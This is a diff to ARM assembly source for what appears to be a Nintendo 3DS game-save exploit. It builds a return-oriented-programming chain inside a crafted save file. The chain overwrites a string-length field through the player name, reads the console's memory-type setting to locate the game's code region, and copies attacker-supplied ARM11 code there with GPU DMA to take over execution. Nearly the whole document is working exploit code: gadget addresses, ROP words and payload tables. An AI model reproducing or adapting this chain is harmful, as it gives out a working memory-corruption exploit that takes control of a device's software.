@@ -48,12 +48,6 @@
 #define TEXT_APPMEM_OFFSET (CODE_ALIGNEDSIZE - 0x5B000)
 #endif
 
-#if NEW3DS==0
-#define APPMEMSIZE 0x04000000
-#else
-#define APPMEMSIZE 0x07C00000
-#endif
-
 #if REGION==1 //USA
 #define SENDCMDADR 0x4360a0 //Writes r0 to r4+0, then copies 0x80-bytes from r1 to r4+4. Then uses svcSendSyncRequest with handle *r5.
 #define GXLOWCMD_0 0x49398c
@@ -112,6 +106,8 @@
 #define REGPOPR5R6 0x4b7cb0 //Addr of this instruction: "pop {r5, r6, pc}"
 #define POPPC 0x1048a4 //Addr of this instruction: "pop {pc}"
 #define STACKMEMCPYADR 0x1aa988
+
+#define ROP_WRITER4_TOR0_x2b0_POPR4R5R6PC 0x174de8 //"str r4, [r0, #0x2b0]" "pop {r4, r5, r6, pc}"
 
 #define RSAINFO_OFF 0x880+0x40
 
@@ -245,7 +241,7 @@ _start:
 .ascii "ZELDAZ"
 .hword 0x428
 .word 0xdfdfdfdf
-.word 0x8 @ This value overwrites the wchar length u32 stored in the ctx when the player-name is copied to the ctx, therefore use a value which won't cause other crashes.
+.word 0x8 @ This value overwrites the utf16 string-length u32 stored in the ctx when the player-name is copied to the ctx, therefore use a value which won't cause other crashes.
 
 .byte 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x02, 0x60, 0xf4, 0x01, 0x00, 0x00
 .byte 0x65, 0x00, 0x01, 0x00, 0x01, 0x01, 0x00, 0x00, 0x3b, 0x06, 0x0f, 0x02
@@ -655,14 +651,61 @@ SENDCMD SAVEADR+0x1040, 0x00190040, SAVEADR+0x1200 @ ReloadDBS
 .word 0 @ r9
 .word 0 @ sl
 
-/*.word REGPOPADR //ldr r1, [r1, #4] ; add r1, r1, r2, lsl #3 ; str r1, [r0]
+//The following determines the actual APPMEMALLOC via checking configmem APPMEMTYPE, since the configmem APPMEMALLOC is fixed to 0x04000000 even on New3DS.
+
+.word REGPOPADR
+.word (gxcpy_appmemtype_ropword-_start) + SAVEADR @ r0
+.word 0x1FF80030-4 @ r1
+.word 0 @ r2
+.word 0 @ r3
+.word 0x10 @ r4
+.word 0 @ r5
+.word ROP_LDRR1R1_ADDR1R1R2LSL3_STRR1R0 @ r6 "ldr r1, [r1, #4] ; add r1, r1, r2, lsl #3 ; str r1, [r0]"
+.word 0 @ fp
+.word 0 @ ip
+.word BLXR6 @ Copy configmem APPMEMTYPE to gxcpy_appmemtype_ropword.
+
+.word 0, 0
+.word 0
+.word 0
+.word 0, 0, 0, 0, 0
+
+.word REGPOPADR @ This ROP sets r4 to (appmemtype_appmemsize_table-4) + APPMEMTYPE*4.
+.word ((appmemtype_appmemsize_table - 4) -_start) + SAVEADR @ r0
+gxcpy_appmemtype_ropword:
+.word 0 @ r1
+.word 0 @ r2
+.word 0 @ r3
+.word 0 @ r4
+.word SAVEADR+0x1018 @ r5, +0x38 is a classptr.
+.word 0 @ r6
+.word 0 @ fp
+.word 0 @ ip
+.word ADDSHIFTVAL_BLXR3 @ r4 = r0 + r1<<2. classptr = *(r5+0x38). Calls vtable funcptr +16 with r3 for the funcptr, r2=*r4, r1=<ptr loaded from pool>
+
+@ Write r4 to gxcpy_appmemsizeptr_ropword.
+.word ((gxcpy_appmemsizeptr_ropword-_start) + SAVEADR) - 0x2b0 @ r0
+.word 0 @ r1
+.word 0 @ r2
+.word 0 @ r3
+.word 0 @ sl
+.word 0 @ ip
+
+.word ROP_WRITER4_TOR0_x2b0_POPR4R5R6PC @ "str r4, [r0, #0x2b0]" "pop {r4, r5, r6, pc}"
+
+.word 0 @ r4
+.word 0 @ r5
+.word 0 @ r6
+
+.word REGPOPADR
 .word (gxcpy_dstaddr_ropword-_start) + SAVEADR @ r0
-.word 0x1FF80040-4 @ r1
+gxcpy_appmemsizeptr_ropword:
+.word 0x0 @ r1, written by the above ROP.
 .word (0x14000000 - TEXT_APPMEM_OFFSET)>>3 @ r2
 .word 0 @ r3
 .word 0x0f @ r4
 .word 0 @ r5
-.word ROP_LDRR1R1_ADDR1R1R2LSL3_STRR1R0 @ r6
+.word ROP_LDRR1R1_ADDR1R1R2LSL3_STRR1R0 @ r6 "ldr r1, [r1, #4] ; add r1, r1, r2, lsl #3 ; str r1, [r0]"
 .word 0 @ fp
 .word 0 @ ip
 .word BLXR6 @ Calculate the linearmem address of .text on-the-fly.
@@ -670,12 +713,29 @@ SENDCMD SAVEADR+0x1040, 0x00190040, SAVEADR+0x1200 @ ReloadDBS
 .word 0, 0
 .word 0
 .word 0
-.word 0, 0, 0, 0, 0*/
+.word 0, 0, 0, 0, 0
+
+.word REGPOPADR
+.word (gxcpy_dstaddr-_start) + SAVEADR @ r0
+.word ((gxcpy_dstaddr_ropword-4)-_start) + SAVEADR @ r1
+.word 0 @ r2
+.word 0 @ r3
+.word 0x10 @ r4
+.word 0 @ r5
+.word ROP_LDRR1R1_ADDR1R1R2LSL3_STRR1R0 @ r6 "ldr r1, [r1, #4] ; add r1, r1, r2, lsl #3 ; str r1, [r0]"
+.word 0 @ fp
+.word 0 @ ip
+.word BLXR6 @ Copy gxcpy_dstaddr_ropword to gxcpy_dstaddr.
+
+.word 0, 0
+.word 0
+.word 0
+.word 0, 0, 0, 0, 0
 
 .word REGPOPADR//This code exec method uses GX command4 to copy arm11code using GPU DMA, to .text.
 .word 0x14700000 @ r0, GPU DMA src addr
 gxcpy_dstaddr_ropword:
-.word APPMEMSIZE + (0x14000000 - TEXT_APPMEM_OFFSET) @ r1, GPU DMA dst addr.
+.word 0x0 @ r1, GPU DMA dst addr. The actual addr gets written by the above ROP.
 .word ARM11CODE_SIZE @ r2, size
 .word 0 @ r3, width0
 .word 0x0f @ r4
@@ -720,6 +780,9 @@ gxcpy_dstaddr_ropword:
 .word 0
 .word 0, 0, 0, 0, 0, 0
 .word 0x00100000
+
+gxcpy_dstaddr:
+.word 0
 #endif
 
 /*.word REGPOPADR
@@ -1056,7 +1119,8 @@ mov r0, #8
 str r0, [sp, #12] @ flags
 ldr r0, =0x14700000 @ GPU DMA src addr
 
-ldr r1, =(APPMEMSIZE + (0x14000000 - TEXT_APPMEM_OFFSET))
+ldr r1, =(gxcpy_dstaddr-_start) + SAVEADR
+ldr r1, [r1]
 mov r7, r1
 ldr r2, =0x1000
 add r1, r1, r2
@@ -1383,6 +1447,16 @@ arm11code_payloadpath_end:
 .word SAVEADR+0x1058
 .word 0, 0, 0, 0
 .word REGPOPR0R3SL
+
+appmemtype_appmemsize_table: @ This is a table for the actual APPLICATION mem-region size, for each APPMEMTYPE.
+.word 0x04000000 @ type0
+.word 0x04000000 @ type1
+.word 0x06000000 @ type2
+.word 0x05000000 @ type3
+.word 0x04800000 @ type4
+.word 0x02000000 @ type5
+.word 0x07C00000 @ type6
+.word 0x0B200000 @ type7
 
 #ifdef REPLACE_SRVACCESSCONTROL
 .space (_start + 0x1080) - . @ srv:pm cmd
